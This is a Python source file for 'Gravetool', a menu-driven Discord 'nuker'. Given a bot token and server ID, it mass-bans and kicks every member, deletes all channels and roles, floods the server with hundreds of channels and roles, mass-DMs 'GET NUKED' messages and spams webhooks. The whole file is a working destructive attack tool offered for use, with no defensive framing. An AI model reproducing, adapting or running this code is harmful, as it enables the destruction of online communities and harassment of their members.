import discord
from discord import SyncWebhook
import colorama
from discord.ext import commands
import webbrowser
import time
import os
os.system('cls' if os.name == 'nt' else 'clear')
time.sleep(2)
print("\n")
print(colorama.Fore.RED+"["+colorama.Fore.WHITE+"!"+colorama.Fore.RED+"] "+colorama.Fore.WHITE+"Enter your Bot token: ")
time.sleep(1)
bottoken=input()
print(colorama.Fore.RED+"["+colorama.Fore.WHITE+"!"+colorama.Fore.RED+"] "+colorama.Fore.WHITE+"Enter Guild id:")
guildid=input()
print(colorama.Fore.RED+"["+colorama.Fore.WHITE+"!"+colorama.Fore.RED+"] "+colorama.Fore.WHITE+"Enter Channel Id: ")
channel=input()
time.sleep(1)
os.system('cls' if os.name == 'nt' else 'clear')
print(colorama.Fore.RED+
"\n"

"\n"
"\n"
"\n"
 "                                ▄████  ██▀███   ▄▄▄    ██▒   █▓▓█████    ▄▄▄█████▓ ▒███████   ▒███████   ██▓      \n"
"                                 ██▒ ▀█▒▓██ ▒ ██▒▒████▄ ▓██░   █▒▓█   ▀    ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒        \n"
"                                ▒██░▄▄▄░▓██ ░▄█ ▒▒██  ▀█▄▓██  █▒░▒███      ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░     \n" 
"                                ░▓█  ██▓▒██▀▀█▄  ░██▄▄▄▄██▒██ █░░▒▓█  ▄    ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░      \n"
"                                 ░▒▓███▀▒░██▓ ▒██▒ ▓█   ▓██▒▒▀█░  ░▒████▒     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒  \n"
"                                 ░▒   ▒ ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▐░  ░░ ▒░ ░     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░   \n"
"                                    ░   ░   ░▒ ░ ▒░  ▒   ▒▒ ░░ ░░   ░ ░  ░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░  \n"
"                                   ░ ░   ░   ░░   ░   ░   ▒     ░░     ░        ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░    \n"
"                                   ░    ░           ░  ░   ░     ░  ░                ░ ░      ░ ░      ░  ░       \n"
"                                  ░                                                                               "
  
  
 "    "                                   
"\n"


"                                     Gravetool© | Coder:𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐘𝐮𝐤𝐢#9256 | Users: 237 ")
print(colorama.Fore.WHITE+
"                              ╔═════════════════════╦═══════════════════════════════╦══════════════════════╗\n"
"                              ║                     ║                               ║                      ║\n"
"                              ║"+colorama.Fore.RED+" ["+colorama.Fore.WHITE +"1"+colorama.Fore.RED+"] Massban "+colorama.Fore.WHITE+"        ║"+colorama.Fore.RED+" ["+colorama.Fore.WHITE+"5"+colorama.Fore.RED+"] Create Channels"+colorama.Fore.WHITE+"           ║"+colorama.Fore.RED+" ["+colorama.Fore.WHITE+"09"+colorama.Fore.RED+"] Webhook-Spammer"+colorama.Fore.WHITE+" ║\n"
"                              ║" +colorama.Fore.RED+" ["+colorama.Fore.WHITE  +  "2"  +colorama.Fore.RED +"] Masskick"+colorama.Fore.WHITE+ "        ║"+colorama.Fore.RED+" ["+colorama.Fore.WHITE+"6"+colorama.Fore.RED+"] Create Roles"+colorama.Fore.WHITE+"              ║"+colorama.Fore.RED+" ["+colorama.Fore.WHITE+"10"+colorama.Fore.RED+"] Github"+colorama.Fore.WHITE+"          ║\n"
"                              ║" +colorama.Fore.RED+" ["+colorama.Fore.WHITE+"3"+colorama.Fore.RED+"] Delete Channels"+colorama.Fore.WHITE  +" ║"+colorama.Fore.RED+" ["+colorama.Fore.WHITE+"7"+colorama.Fore.RED+"] Nuke Server"+colorama.Fore.WHITE+"               ║"+colorama.Fore.RED+" ["+colorama.Fore.WHITE+"11"+colorama.Fore.RED+"] Twitter"+colorama.Fore.WHITE+"         ║\n"
"                              ║" +colorama.Fore.RED+" ["+colorama.Fore.WHITE+"4"+colorama.Fore.RED+"] Delete Roles"+colorama.Fore.WHITE+"    ║"+colorama.Fore.RED+" ["+colorama.Fore.WHITE+"8"+colorama.Fore.RED+"] Mass-Dmer"+colorama.Fore.WHITE+"                 ║"+colorama.Fore.RED+" ["+colorama.Fore.WHITE+"12"+colorama.Fore.RED+"] Discord Server"+colorama.Fore.WHITE+"  ║\n"

"                              ║                     ║                               ║                      ║\n"
"                              ╚═════════════════════╩═══════════════════════════════╩══════════════════════╝\n"
"\n")
choice=input(colorama.Fore.RED+"["+colorama.Fore.WHITE+"!"+colorama.Fore.RED+"] "+colorama.Fore.WHITE+"Gravetool: ")
if choice=="1":
   time.sleep(1)
   intents = discord.Intents(messages=True, guilds=True, members=True)
   client = commands.Bot(command_prefix='%', intents=intents)
   @client.event
   async def on_ready():
      guild = client.get_guild(int(guildid))
      for user in guild.members:
        try:
            await user.ban()
            print(f"Banned {user.name}")
        except:
            pass
      print("Banned every Member!")
      time.sleep(5)
      os.system("gravetool.py")
            
          
   client.run(bottoken)
   
if choice=="2":
   time.sleep(1)
   intents = discord.Intents(messages=True, guilds=True, members=True)
   client = commands.Bot(command_prefix='%', intents=intents)
   @client.event
   async def on_ready():
      guild = client.get_guild(int(guildid))
      for user in guild.members:
        try:
            await user.kick()
            print(f"Kicked {user.name}")
        except:
            pass
      print("Kicked every Member!")
      time.sleep(5)
      os.system("gravetool.py")
            
          
   client.run(bottoken)

if choice=="3":
   time.sleep(2)
   intents = discord.Intents(messages=True, guilds=True, members=True)
   client = commands.Bot(command_prefix='%', intents=intents)
   @client.event
   async def on_ready():
      guild = client.get_guild(int(guildid))
      for channel in list(guild.channels):
        try:
            await channel.delete()
            print (channel.name + " has been deleted")
        except:
            pass
      print("All Channels got deleted!")
      time.sleep(5)
      os.system("gravetool.py")
            
          
   client.run(bottoken)
   
if choice=="4":
   time.sleep(2)
   intents = discord.Intents(messages=True, guilds=True, members=True)
   client = commands.Bot(command_prefix='%', intents=intents)
   @client.event
   async def on_ready():
      guild = client.get_guild(int(guildid))
      for role in list(guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted")
        except:
            pass
      print("All Roles got deleted!")
      time.sleep(5)
      os.system("gravetool.py")
   client.run(bottoken)
   
if choice=="5":
   time.sleep(2)
   intents = discord.Intents(messages=True, guilds=True, members=True)
   client = commands.Bot(command_prefix='%', intents=intents)
   @client.event
   async def on_ready():
      guild = client.get_guild(int(guildid))
      for x in range(200):
         await guild.create_text_channel('Invalid Yuki on Top!')
      print("Channels got created")
      time.sleep(5)
      os.system("gravetool.py")
   client.run(bottoken)
   
if choice=="6":
   time.sleep(2)
   intents = discord.Intents(messages=True, guilds=True, members=True)
   client = commands.Bot(command_prefix='%', intents=intents)
   @client.event
   async def on_ready():
      guild = client.get_guild(int(guildid))
      for x in range(100):
         await guild.create_role(name="Yuki on Top!")
      print("Roles got created")
      time.sleep(5)
      os.system("gravetool.py")
   client.run(bottoken)
  
if choice=="7":
   time.sleep(2)
   intents = discord.Intents(messages=True, guilds=True, members=True)
   client = commands.Bot(command_prefix='%', intents=intents)
   @client.event
   async def on_ready():
      guild = client.get_guild(int(guildid))
      for member in guild.members:
        time.sleep(0)
        try:
            await member.send("GET NUKED BY INVALID YUKI")
        except:
            pass
      for member in guild.members:
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
      for channel in list(guild.channels):
        try:
            await channel.delete()
            print (channel.name + " has been deleted")
        except:
            pass
      for x in range(100):
         channel=await guild.create_text_channel('Invalid Yuki on Top!')
         await channel.send("\@everyone got nuked!")
      for role in list(guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted")
        except:
            pass
      print("Server got nuked!")
      time.sleep(5)
      os.system("gravetool.py")
   client.run(bottoken)
   
if choice=="8":
   time.sleep(2)
   print("\n")
   print(colorama.Fore.RED+"["+colorama.Fore.WHITE+"!"+colorama.Fore.RED+"] "+colorama.Fore.WHITE+"Enter the message you want to mass dm: ")
   mmassmessage=input()
   intents = discord.Intents(messages=True, guilds=True, members=True)
   client = commands.Bot(command_prefix='%', intents=intents)
   @client.event
   async def on_ready():
      guild = client.get_guild(int(guildid))
      for member in guild.members:
        time.sleep(0)
        try:
            await member.send(mmassmessage)
            print(f"{member.name} dmt!")
        except:
            pass
      print("Finished with mass dm!")
      time.sleep(5)
      os.system("gravetool.py")
   client.run(bottoken)
   
if choice == "9":
      print(colorama.Fore.RED+"["+colorama.Fore.WHITE+"!"+colorama.Fore.RED+"] "+colorama.Fore.WHITE+"Enter your webhook: ")
      webhook=input()
      webhook = SyncWebhook.from_url(webhook)
      print(colorama.Fore.RED+"["+colorama.Fore.WHITE+"!"+colorama.Fore.RED+"] "+colorama.Fore.WHITE+"Enter the message you want to spam: ")
      spammessagewebhook=input()
      print(colorama.Fore.RED+"["+colorama.Fore.WHITE+"!"+colorama.Fore.RED+"] "+colorama.Fore.WHITE+"Enter the amount of spams: ")
      spamamount=input()
      for x in range(int(spamamount)):
         webhook.send(spammessagewebhook)
      print("Finished spamming")
      time.sleep(5)
      os.system("gravetool.py")
if choice == "09":
      print(colorama.Fore.RED+"["+colorama.Fore.WHITE+"!"+colorama.Fore.RED+"] "+colorama.Fore.WHITE+"Enter your webhook: ")
      webhook=input()
      webhook = SyncWebhook.from_url(webhook)
      print(colorama.Fore.RED+"["+colorama.Fore.WHITE+"!"+colorama.Fore.RED+"] "+colorama.Fore.WHITE+"Enter the message you want to spam: ")
      spammessagewebhook=input()
      print(colorama.Fore.RED+"["+colorama.Fore.WHITE+"!"+colorama.Fore.RED+"] "+colorama.Fore.WHITE+"Enter the amount of spams: ")
      spamamount=input()
      for x in range(int(spamamount)):
         webhook.send(spammessagewebhook)
      print("Finished spamming")
      time.sleep(5)
      os.system("gravetool.py")  
        
if choice == "10":
   webbrowser.open('https://github.com/HotXfudge') 
   time.sleep(5)
   os.system("gravetool.py")


if choice == "11":
   webbrowser.open('https://twitter.com/hotxfudge8') 
   time.sleep(5)
   os.system("gravetool.py")   
   
if choice == "12":
   webbrowser.open('https://discord.gg/2N6xu3cFCk') 
   time.sleep(5)
   os.system("gravetool.py") 
   
   

